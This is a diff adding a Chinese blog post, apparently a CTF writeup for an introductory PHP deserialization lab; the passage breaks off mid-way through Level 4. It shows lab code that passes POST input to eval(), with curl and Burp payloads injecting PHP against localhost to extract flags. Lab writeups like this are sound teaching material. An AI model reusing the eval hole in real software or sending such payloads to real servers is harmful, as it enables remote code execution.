@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css">
+
+
+  
+  <title>Hello CTF 从 0 开始的PHP反序列化入门靶场 - Moyuin&#39;s Note</title>
+  
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/174886737?v=4">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Hello CTF 从 0 开始的PHP反序列化入门靶场 - Moyuin&#39;s Note" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="https://notes.moyuin.top/2025/08/25/xue-xi/ctf/hello-ctf-cong-0-kai-shi-de-php-fan-xu-lie-hua-ru-men-ba-chang-writeup/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2025-08-25T07:32:51.000Z" />
+  
+  <meta property="og:article:author" content="Moyuin" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="4"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Moyuin&#39;s Notebook</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">归档</a>
+            
+            
+            
+            <a class="nav-item" href="/tags">标签</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">分类</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/moyuin-aka" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/日常学习/">日常学习</a>
+        
+            <a href="/categories/日常学习/CTF学习/">CTF学习</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>August</span>
+            <span>25,</span>
+            <span>2025</span>
+        </div>
+        
+
+        <h1 class="title">Hello CTF 从 0 开始的PHP反序列化入门靶场</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- ✅ 插入 TOC 目录渲染 -->
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Hello CTF - 从 0 开始的PHP反序列化入门靶场 writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2"><span class="toc-number">1.1.</span> <span class="toc-text">部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">1.2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">1.3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">1.4.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">1.5.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">1.6.</span> <span class="toc-text">Level 5</span></a></li></ol></li></ol>
+    </div>
+    
+
+    <div class="content">
+        <h1>Hello CTF - 从 0 开始的PHP反序列化入门靶场 writeup</h1>
+<p>Repo: <a target="_blank" rel="noopener" href="https://github.com/ProbiusOfficial/PHPSerialize-labs">github.com/ProbiusOfficial/PHPSerialize-labs</a><br>
+讨厌 PHP……不过也是做上了探姬老师出的题了。</p>
+<h2 id="部署">部署</h2>
+<p>直接 docker 部署。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-p</span> <span class="token number">8081</span>:80 <span class="token parameter variable">-d</span> ghcr.io/probiusofficial/phpserialize-labs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>直接访问 <a href="localhost:8081">localhost:8081</a> 即可进入页面。</p>
+<p><img src="https://s3.moyuin.top/blog-images/2025/08/25/68ac18778ad94.png" alt="image.png"></p>
+<hr>
+<h2 id="Level-1">Level 1</h2>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/*  
+--- HelloCTF - 反序列化靶场 关卡 1 : 类的实例化 ---   
+  
+HINT：尝实例化下面的FLAG类吧！  
+  
+# -*- coding: utf-8 -*-  
+# @Author: 探姬  
+# @Date:   2024-07-01 20:30  
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  
+# @email:  admin@hello-ctf.com  
+# @link:   hello-ctf.com  
+  
+*/</span>  
+  
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token variable">$flag_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF&#123;？？？？&#125;"</span><span class="token punctuation">;</span>  
+  
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag_string</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>古法 curl 炮制 post 请求，让 <code>code=new FLAG();</code> 。</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">"code=new FLAG();"</span> http://localhost:8081/Level1/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ul>
+<li>或者使用 burpsuite 发送 post 请求，将 GET 改为 POST，在最后 body 里添加</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>发送 POST 请求需要带 header</strong>：<code>Content-Type: application/x-www-form-urlencoded</code></p>
+<p>得到 flag</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;OK_Now_y0u_c4n_se3_me&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<hr>
+<h2 id="Level-2">Level 2</h2>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">`<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>      <span class="token comment">/*   
+--- HelloCTF - 反序列化靶场 关卡 2 : 类值的传递 ---       
+HINT：尝试将flag传递出来~      
+# -*- coding: utf-8 -*-   
+# @Author: 探姬   
+# @Date:   2024-07-01 20:30   # @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs   # @email:  admin@hello-ctf.com   
+# @link:   hello-ctf.com      */</span>      
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token variable">$flag_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF&#123;？？？？&#125;"</span><span class="token punctuation">;</span>      
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>           
+	<span class="token keyword">public</span> <span class="token variable">$free_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">;</span>   
+	           
+	<span class="token keyword">function</span> <span class="token function-definition function">get_free_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               
+		<span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">free_flag</span><span class="token punctuation">;</span>           
+	<span class="token punctuation">&#125;</span>       
+<span class="token punctuation">&#125;</span>   
+<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          
+	<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
+	<span class="token variable">$target</span><span class="token operator">-></span><span class="token function">get_free_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+<span class="token punctuation">&#125;</span>   
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>    
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
+<span class="token punctuation">&#125;</span>   
+	
+	Now Flag is <span class="token operator">??</span><span class="token operator">?</span>
+
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>一样是发送 POST 请求，但是设定好 code 后给 target 的 free_flag 修改为<br>
+<code>$flag_string</code> 即可。</p>
+<ul>
+<li>对于 burpsuite，将 GET 改为 POST 后，在最后 body 添加：</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$target</span><span class="token operator">-></span><span class="token property">free_flag</span><span class="token operator">=</span><span class="token variable">$flag_string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<ul>
+<li>对于 curl，curl 在终端对 <code>$</code> 有特殊处理，需要使用单引号包裹请求。
+<blockquote>
+<p><code>$</code> 符号在 Linux/macOS 的终端（我们称之为 Shell，例如 Bash、Zsh）里是一个有特殊含义的字符。它被用来<strong>引用变量</strong>。</p>
+</blockquote>
+</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">'code=new FLAG();
+$target->free_flag=$flag_string;'</span> http://localhost:8081/Level2/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Now Flag is HelloCTF&#123;I_giv3_t0_y0u&amp;y0u_giv3_t0_me&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<hr>
+<h2 id="Level-3">Level 3</h2>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+  
+<span class="token comment">/*  
+--- HelloCTF - 反序列化靶场 关卡 3 : 对象中值的权限 ---   
+  
+HINT：尝试将flag传递出来~  
+  
+# -*- coding: utf-8 -*-  
+# @Author: 探姬  
+# @Date:   2024-07-01 20:30  
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  
+# @email:  admin@hello-ctf.com  
+# @link:   hello-ctf.com  
+  
+*/</span>  
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token variable">$public_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"HelloCTF&#123;?"</span><span class="token punctuation">;</span>  
+    <span class="token keyword">protected</span> <span class="token variable">$protected_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?"</span><span class="token punctuation">;</span>  
+    <span class="token keyword">private</span> <span class="token variable">$private_flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"?&#125;"</span><span class="token punctuation">;</span>  
+  
+    <span class="token keyword">function</span> <span class="token function-definition function">get_protected_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">protected_flag</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">function</span> <span class="token function-definition function">get_private_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">private_flag</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">SubFLAG</span> <span class="token keyword">extends</span> <span class="token class-name">FLAG</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">function</span> <span class="token function-definition function">show_protected_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">protected_flag</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">function</span> <span class="token function-definition function">show_private_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">private_flag</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token variable">$sub_target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubFLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+  
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Trying to get FLAG...&lt;br>"</span><span class="token punctuation">;</span>  
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Public Flag: "</span><span class="token operator">.</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">public_flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>  
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Protected Flag:"</span><span class="token operator">.</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">protected_flag</span> <span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>  
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Private Flag:"</span><span class="token operator">.</span><span class="token variable">$target</span><span class="token operator">-></span><span class="token property">private_flag</span> <span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token delimiter important">?></span></span>
+Trying to get FLAG...  
+Public Flag: HelloCTF&#123;se3_me_  
+Protected Flag: Error: Cannot access protected property FLAG:: in ?  
+Private Flag: Error: Cannot access private property FLAG:: in ?  
+...Wait,where is the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>拼接 flag，一个一个来。<br>
+Public 类是可以直接读取的。<br>
+Protected 是子类可以读取的，<code>echo $sub_target-&gt;show_protected_flag();</code> 可得到。<br>
+Private 类是子类也不可读取，只能通过 PHP 特性获取。</p>
+<p>常用的方法是，在PHP 有一个反射越权特性，可以通过构造反射类，在反射类里面设定访问权限，从而读取 private 内容。</p>
+<blockquote>
+<p>PHP 提供了一整套强大的“反射”API，它允许程序在运行时检查自身的结构，包括类、方法、属性等，甚至可以无视 <code>private</code> 和 <code>protected</code> 的限制。这是最常用、最正规的“越权”方法。<br>
+<strong>核心思想</strong>：</p>
+<ol>
+<li>获取这个类的反射实例 (<code>ReflectionClass</code>)。</li>
+<li>从反射实例中获取私有属性的反射实例 (<code>ReflectionProperty</code>)。</li>
+<li><strong>使用 <code>setAccessible(true)</code> 方法，强行将这个私有属性设置为“可访问”</strong>。</li>
+<li>读取属性的值。</li>
+</ol>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 首先必须有一个 FLAG 类的具体对象</span>
+<span class="token comment">// 这个对象已经存在了，比如叫 $target</span>
+<span class="token comment">// 如果没有，需要自己 new 一个</span>
+
+<span class="token comment">// 获取 FLAG 类的反射</span>
+<span class="token variable">$reflection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 获取私有属性 private_flag</span>
+<span class="token variable">$property</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-></span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'private_flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 设置属性为可访问</span>
+<span class="token variable">$property</span><span class="token operator">-></span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 从这个实例中获取值，而不是从 $reflection 中获取</span>
+<span class="token variable">$secret_value</span> <span class="token operator">=</span> <span class="token variable">$property</span><span class="token operator">-></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$secret_value</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从而构造 POST 的 payload：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">code<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">echo</span> <span class="token variable">$target</span><span class="token operator">-></span><span class="token property">public_flag</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$sub_target</span><span class="token operator">-></span><span class="token function">show_protected_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$reflection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$property</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-></span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'private_flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$property</span><span class="token operator">-></span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$secret_value</span> <span class="token operator">=</span> <span class="token variable">$property</span><span class="token operator">-></span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$secret_value</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>或者发送 curl 请求：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-X</span> POST <span class="token parameter variable">-d</span> <span class="token string">'code=new FLAG();echo $target->public_flag;echo $sub_target->show_protected_flag();$reflection = new ReflectionClass('</span>FLAG<span class="token string">');$property =$reflection->getProperty('</span>private_flag<span class="token string">');$property->setAccessible(true);$secret_value = $property->getValue($target);echo $secret_value;'</span> http://localhost:8081/Level3/index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">HelloCTF&#123;se3_me_4nd_g3t_mmmme&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<hr>
+<h2 id="Level-4">Level 4</h2>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
+  
+<span class="token comment">/*  
+--- HelloCTF - 反序列化靶场 关卡 4 : 序列化 ---   
+  
+HINT：嗯！？全是私有，怎么获取flag呢？试试序列化！  
+  
+# -*- coding: utf-8 -*-  
+# @Author: 探姬  
+# @Date:   2024-07-01 20:30  
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs  
+# @email:  admin@hello-ctf.com  
+# @link:   hello-ctf.com  
+  
+*/</span>  
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG3</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">private</span> <span class="token variable">$flag3_object_array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"？"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">FLAG</span><span class="token punctuation">&#123;</span>  
+     <span class="token keyword">private</span> <span class="token variable">$flag1_string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"？"</span><span class="token punctuation">;</span>  
+     <span class="token keyword">private</span> <span class="token variable">$flag2_number</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">;</span>  
+     <span class="token keyword">private</span> <span class="token variable">$flag3_object</span><span class="token punctuation">;</span>  
+  
+    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       
+     <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag3_object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token variable">$flag_is_here</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+  
+<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>关于 PHP 反序列化的知识：</p>
+<blockquote>
+<p><strong>序列化 (<code>serialize</code>)</strong>：将一个对象（或数组等）的状态，转换成一个可以存储或传输的字符串。<br>
+<strong>反序列化 (<code>unserialize</code>)</strong>：读取序列化后的字符串，并在内存中重建出原始的对象。</p>
+</blockquote>
+<p>序列化示例：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">SecretVault</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$secret_key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"CTF&#123;...&#125;"</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$owner</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Alice"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$vault</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretVault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 把 $vault 对象序列化</span>
+<span class="token variable">$serialized_string</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$vault</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token variable">$serialized_string</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出的字符串会是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">O:10: &quot;SecretVault&quot;:2:&#123;s:25: &quot; SecretVault secret_key&quot;;s:9: &quot;CTF&#123;...&#125;&quot;;s:5: &quot;owner&quot;;s:5: &quot;Alice&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这个字符串看起来复杂，但很有规律：</p>
+<ul>
+<li><code>O</code>: 表示这是一个对象 (Object)。</li>
